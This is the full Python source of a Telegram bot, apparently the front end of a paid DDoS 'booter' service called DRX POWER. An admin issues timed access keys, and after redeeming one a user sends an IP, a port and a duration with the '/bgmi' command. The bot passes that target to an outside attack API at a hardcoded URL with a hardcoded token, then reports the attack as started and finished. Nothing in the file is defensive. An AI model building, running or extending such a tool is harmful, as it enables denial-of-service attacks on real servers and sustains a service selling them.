import telebot
import json
import requests
import datetime
import os
import time
import socket
import threading

# Try to import psutil (optional - if not available, status will show limited info)
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("⚠️ psutil not available - status command will show limited info")

# - Load Config (Admin ID aur Token)
if os.path.exists('config.json'):
    with open('config.json') as f:
        config = json.load(f)
else:
    print("Error: config.json file nahi mili!")
    exit()

# Create bot instance
bot = telebot.TeleBot(config['token'])

# FIX 1: Remove webhook to avoid 409 conflict error
try:
    bot.remove_webhook()
    print("✅ Webhook removed successfully")
except Exception as e:
    print(f"Webhook removal note: {e}")

# FIX 2: Use environment variable for API URL (works on Render)
API_URL = os.environ.get('API_URL', 'https://drx-api-x40n.onrender.com/hit')
AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

# Database files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

def load_data(file):
    if os.path.exists(file):
        with open(file, 'r') as f:
            return json.load(f)
    return {}

def save_data(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

# - Commands Logic
@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(m, "🔥 **DRX POWER Bot Active**\n\nWelcome! Use /help to see command list.")

@bot.message_handler(commands=['help'])
def help_cmd(m):
    help_text = """
🚀 **Available Commands:**
/bgmi <ip> <port> <time> - Start Attack
/redeem <key> - Activate Plan
/myinfo - Check your Plan
/status - Current Attack Status

👑 **Admin Only:**
/genkey <duration> - Generate Key (e.g., /genkey 1d)
    """
    bot.reply_to(m, help_text)

@bot.message_handler(commands=['genkey'])
def genkey(m):
    if str(m.from_user.id) != str(config['admin']):
        return bot.reply_to(m, "❌ Admin only command.")
    
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")
    
    duration = args[1]
    key = "DRX-" + os.urandom(3).hex().upper()
    
    keys = load_data(KEYS_FILE)
    keys[key] = duration
    save_data(KEYS_FILE, keys)
    
    bot.reply_to(m, f"🔑 **Key Generated:** `{key}`\n⏳ **Duration:** {duration}")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "Usage: /redeem DRX-XXXX")
    
    user_key = args[1]
    keys = load_data(KEYS_FILE)
    
    if user_key in keys:
        duration = keys[user_key]
        users = load_data(USERS_FILE)
        
        users[str(m.from_user.id)] = {"plan": duration, "active": True}
        save_data(USERS_FILE, users)
        
        del keys[user_key]
        save_data(KEYS_FILE, keys)
        bot.reply_to(m, f"✅ **Redeemed Successfully!**\nPlan: {duration} active.")
    else:
        bot.reply_to(m, "❌ Invalid or Expired Key.")

# FIX 3: Fixed attack command - properly checks JSON response for success
@bot.message_handler(commands=['bgmi'])
def attack(m):
    users = load_data(USERS_FILE) 
    user_id = str(m.from_user.id)
    
    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(m, "❌ **ACCESS DENIED!**\nNo active plan found. Please use /redeem first.")

    args = m.text.split()
    if len(args) != 4: 
        return bot.reply_to(m, "❌ **Format:** `/bgmi <IP> <PORT> <TIME>`")
    
    ip, port, attack_time = args[1], args[2], args[3]
    
    # Validate port and time are numbers
    if not port.isdigit():
        bot.reply_to(m, "❌ Port must be a number!")
        return
    if not attack_time.isdigit():
        bot.reply_to(m, "❌ Time must be a number!")
        return
    
    try:
        # Build the full URL
        full_url = f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}"
        print(f"Calling API: {full_url}")  # Debug log
        
        response = requests.get(full_url, timeout=10)
        print(f"Response: {response.status_code} - {response.text}")  # Debug log
        
        # FIX: Check if response contains "success" in the JSON
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('status') == 'success':
                    bot.reply_to(m, f"🚀 **ATTACK STARTED!**\n🎯 Target: `{ip}:{port}`\n🕒 Time: {attack_time}s\n💎 Power: DRX ULTRA\n📶 Status: API CONNECTED ✅")
                    
                    def send_finish():
                        bot.send_message(m.chat.id, f"✅ **ATTACK FINISHED**\n🎯 Target: `{ip}:{port}`\nStatus: Attack Completed")
                    
                    threading.Timer(int(attack_time), send_finish).start()
                else:
                    bot.reply_to(m, f"❌ **API ERROR!**\n{result.get('message', 'Unknown error')}")
            except:
                bot.reply_to(m, f"❌ **API ERROR!**\nInvalid response from API")
        else:
            bot.reply_to(m, f"❌ **API ERROR!**\nStatus Code: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        bot.reply_to(m, "❌ **API OFFLINE!**\nCould not connect to API. Check if API service is running.")
    except requests.exceptions.Timeout:
        bot.reply_to(m, "❌ **API TIMEOUT!**\nAPI did not respond in time.")
    except Exception as e:
        bot.reply_to(m, f"❌ **ERROR!**\n{str(e)}")

@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)
    if user_id in users:
        bot.reply_to(m, f"👤 **User Info:**\nPlan: {users[user_id]['plan']}\nStatus: Active ✅")
    else:
        bot.reply_to(m, "❌ No active plan found.")

# FIX 4: Fixed status command - works even without psutil
@bot.message_handler(commands=['status'])
def status(m):
    # Check API status using HTTP request
    api_status = "Unknown 🔴"
    try:
        # Get base URL (remove /hit)
        api_base = API_URL.replace('/hit', '')
        response = requests.get(api_base, timeout=5)
        if response.status_code == 200:
            api_status = "Online 🟢"
        else:
            api_status = f"Error {response.status_code} 🟡"
    except:
        api_status = "Offline 🔴"
    
    # CPU/RAM info (only if psutil available)
    if PSUTIL_AVAILABLE:
        cpu_usage = psutil.cpu_percent(interval=1)
        ram_usage = psutil.virtual_memory().percent
        load_icon = "🟢" if cpu_usage < 50 else "🟡" if cpu_usage < 80 else "🔴"
        cpu_text = f"{cpu_usage}% {load_icon}"
        ram_text = f"{ram_usage}% 🟢"
    else:
        cpu_text = "N/A"
        ram_text = "N/A"
    
    status_text = (
        "📊 **DRX POWER LIVE STATUS**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot Status:** Active ✅\n"
        f"🔌 **API Connection:** {api_status}\n"
        f"🖥️ **CPU Load:** {cpu_text}\n"
        f"💾 **RAM Usage:** {ram_text}\n"
        f"🚀 **Platform:** Render.com\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(m, status_text, parse_mode="Markdown")

print("🤖 DRX Bot is running and waiting for commands...")
bot.polling(none_stop=True, interval=0, timeout=20)
